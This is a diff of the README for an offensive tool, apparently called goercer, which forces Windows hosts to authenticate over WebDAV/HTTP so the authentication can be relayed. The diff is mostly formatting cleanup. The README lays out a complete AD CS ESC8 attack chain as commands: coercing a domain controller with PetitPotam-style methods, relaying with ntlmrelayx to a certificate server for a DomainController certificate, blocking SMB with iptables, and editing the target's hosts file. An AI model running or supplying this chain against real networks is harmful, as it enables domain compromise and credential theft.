@@ -87,6 +87,7 @@ The `--http` flag enables HTTP/WebDAV coercion for relay attacks like AD CS ESC8
 ### How It Works
 
 When using `--http`, goercer sends WebDAV-formatted paths like `\\10.1.1.99@80/test\test\Settings.ini`:
+
 - The `@80` tells Windows to use WebDAV/HTTP protocol
 - The `/test` path (forward slash) triggers WebClient service
 - The `\test\Settings.ini` (backslashes) completes the file path
@@ -95,6 +96,7 @@ When using `--http`, goercer sends WebDAV-formatted paths like `\\10.1.1.99@80/t
 ### Critical Setup Requirements
 
 **1. WebClient Service Must Be Running on Target**
+
 ```powershell
 # Check if WebClient is running
 sc query webclient
@@ -103,13 +105,13 @@ sc query webclient
 sc start webclient
 ```
 
-**⚠️ CRITICAL: WebClient Requires Hostname, Not IP Address!**
+**Important: WebClient Requires Hostname, Not IP Address**
 
-Windows WebClient service has a critical limitation: **it only activates for hostnames, NOT for IP addresses**. This means:
+Windows WebClient service has a critical limitation: it only activates for hostnames, NOT for IP addresses. This means:
 
-- ❌ **Will NOT work**: `./goercer -l 10.1.1.99 --http` (IP address)
-- ✅ **Will work**: `./goercer -l attacker.domain.local --http` (hostname)
-- ✅ **Will work**: `./goercer -l attacker --http` (NetBIOS name)
+- **Will NOT work**: `./goercer -l 10.1.1.99 --http` (IP address)
+- **Will work**: `./goercer -l attacker.domain.local --http` (hostname)
+- **Will work**: `./goercer -l attacker --http` (NetBIOS name)
 
 **Why this matters:**
 
@@ -118,6 +120,7 @@ WebClient is designed for accessing web folders and SharePoint. It only triggers
 **Solutions:**
 
 1. **Best: Use a hostname that resolves to your listener**
+
    ```bash
    # Add DNS entry or edit target's hosts file
    # Then use hostname
@@ -125,12 +128,14 @@ WebClient is designed for accessing web folders and SharePoint. It only triggers
    ```
 
 2. **Alternative: Use NetBIOS name (single-label hostname)**
+
    ```bash
    # If your listener's NetBIOS name is "ATTACKER"
    ./goercer -t dc.domain.local -l ATTACKER -u admin -d domain.local --http
    ```
 
 3. **Workaround: Modify target's hosts file** (requires prior access)
+
    ```powershell
    # On target (as admin)
    echo "10.1.1.99 attacker.domain.local" >> C:\Windows\System32\drivers\etc\hosts
@@ -164,25 +169,28 @@ sudo ntlmrelayx.py -t ldaps://dc.domain.com --http-port 80 -smb2support
 ### Usage Examples
 
 **Basic HTTP coercion (with hostname):**
+
 ```bash
-# CORRECT - using hostname
+# Correct - using hostname
 ./goercer -t 192.168.1.10 -l attacker.domain.local -u admin -d domain.local --http
 
-# WRONG - IP address won't trigger WebClient
+# Incorrect - IP address won't trigger WebClient
 ./goercer -t 192.168.1.10 -l 10.1.1.99 -u admin -d domain.local --http
 ```
 
 **Custom WebDAV path:**
+
 ```bash
-# You can specify custom path format (hostname still required!)
+# You can specify custom path format (hostname still required)
 ./goercer -t 192.168.1.10 -l attacker.domain.local@80/share -u admin -d domain.local --http
 ```
 
 **ESC8 attack flow:**
+
 ```bash
 # 1. Ensure your listener has a resolvable hostname
-# Option A: Add DNS A record for attacker.domain.local → 10.1.1.99
-# Option B: Use your existing hostname
+#    Option A: Add DNS A record for attacker.domain.local -> 10.1.1.99
+#    Option B: Use your existing hostname
 
 # 2. Block SMB on attacker machine
 sudo iptables -A INPUT -p tcp --dport 445 -j DROP
@@ -191,10 +199,15 @@ sudo iptables -A INPUT -p tcp --dport 445 -j DROP
 sudo ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
     -smb2support --adcs --template DomainController
 
-# 4. Trigger HTTP coercion from domain controller (use hostname!)
+# 4. Trigger HTTP coercion from domain controller (use hostname)
 ./goercer -t dc.domain.local -l attacker.domain.local -u admin -d domain.local --http
+```
 
-# 5.Cause 1**: Using IP address instead of hostname
+### Troubleshooting
+
+**Problem: Callbacks on port 445 instead of port 80**
+
+- **Cause 1**: Using IP address instead of hostname
   - **Solution**: Use a resolvable hostname: `-l attacker.domain.local` instead of `-l 10.1.1.99`
   - WebClient ONLY works with hostnames, not IP addresses
   
@@ -205,7 +218,7 @@ sudo ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
 **Problem: No callbacks at all**
 
 - Check WebClient service is running on target: `sc query webclient`
-- Verify you're using a **hostname** not an IP address for `-l` flag
+- Verify you're using a hostname (not an IP address) for `-l` flag
 - Verify Responder is using `-w` flag for WebDAV support
 - Ensure firewall allows inbound port 80 on listener
 - Verify your hostname resolves correctly from the target
@@ -222,14 +235,6 @@ sudo ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
 - For HTTP mode, you MUST use a hostname, not an IP
 - Ensure your DNS/hostname is properly configured
 - Use NetBIOS name as fallback (single-label hostname)
-- Ensure firewall allows inbound port 80 on listener
-- Try verbose mode to see exact paths: `./goercer ... --http -v`
-
-**Problem: WebClient service won't start on target**
-
-- WebClient may be disabled by Group Policy
-- Try different coercion method: SpoolSample often works better for HTTP than PetitPotam
-- Some Windows versions/patches restrict WebClient activation
 
 ### Supported Methods
 
@@ -237,10 +242,10 @@ All coercion methods support `--http` mode:
 
 | Method | HTTP Support | Notes |
 |--------|--------------|-------|
-| PetitPotam | ✅ | Works on most Windows versions |
-| SpoolSample | ✅ | Often better HTTP success rate |
-| ShadowCoerce | ✅ | Requires VSS configured |
-| DFSCoerce | ✅ | Requires DFS role |
+| PetitPotam | Yes | Works on most Windows versions |
+| SpoolSample | Yes | Often better HTTP success rate |
+| ShadowCoerce | Yes | Requires VSS configured |
+| DFSCoerce | Yes | Requires DFS role |
 
 ### WebDAV Path Format
 
@@ -277,10 +282,14 @@ This mixed forward/backslash format is proven to work reliably across Windows ve
 | `--http` | Use HTTP URL instead of UNC for relay (e.g., AD CS ESC8) |
 | `-v, --verbose` | Debug output |
 
-## Install
+## Installation
 
 ```bash
 git clone https://github.com/ineffectivecoder/goercer.git
 cd goercer
 ./build.sh
 ```
+
+## License
+
+MIT
